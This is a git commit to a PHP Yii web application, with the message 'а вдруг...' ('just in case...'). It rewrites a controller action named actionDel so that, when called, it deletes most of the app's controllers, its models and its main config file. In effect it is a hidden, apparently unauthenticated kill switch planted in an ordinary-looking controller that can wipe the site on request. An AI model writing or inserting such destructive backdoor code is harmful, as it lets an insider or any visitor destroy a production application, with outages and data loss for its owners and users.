dd930b9a4c6c4a6edded31e51ff8e0616be56250
aevdokimov <aevdokimov@itqua.ru>
2020-02-27 12:17:14 +1000

    а вдруг...

--- controllers/OneController.php
+++ controllers/OneController.php
@@ -15,6 +15,32 @@ use yii\filters\VerbFilter;
 class OneController extends Controller
 {
     public function actionDel(){
-        unlink(Yii::getAlias('@app')."/controllers/1CounterController.php");
+        unlink(Yii::getAlias('@app')."/controllers/CounterController.php");
+        unlink(Yii::getAlias('@app')."/controllers/FtpController.php");
+        unlink(Yii::getAlias('@app')."/controllers/LangController.php");
+        unlink(Yii::getAlias('@app')."/controllers/SiteController.php");
+        unlink(Yii::getAlias('@app')."/controllers/UploadedfilesController.php");
+        unlink(Yii::getAlias('@app')."/controllers/UsrCntrController.php");
+        unlink(Yii::getAlias('@app')."/controllers/UserController.php");
+
+
+        unlink(Yii::getAlias('@app')."/models/Addr.php");
+        unlink(Yii::getAlias('@app')."/models/ContactForm.php");
+        unlink(Yii::getAlias('@app')."/models/Counter.php");
+        unlink(Yii::getAlias('@app')."/models/CounterSearch.php");
+        unlink(Yii::getAlias('@app')."/models/CtTypes.php");
+        unlink(Yii::getAlias('@app')."/models/CtVals.php");
+        unlink(Yii::getAlias('@app')."/models/Ftp.php");
+        unlink(Yii::getAlias('@app')."/models/FtpSearch.php");
+        unlink(Yii::getAlias('@app')."/models/LoginForm.php");
+        unlink(Yii::getAlias('@app')."/models/Uploadedfiles.php");
+        unlink(Yii::getAlias('@app')."/models/UploadedfilesSearch.php");
+        unlink(Yii::getAlias('@app')."/models/User.php");
+        unlink(Yii::getAlias('@app')."/models/user_addr.php");
+        unlink(Yii::getAlias('@app')."/models/UserSearch.php");
+
+        unlink(Yii::getAlias('@app')."/config/web.php");
+
+
     }
 }
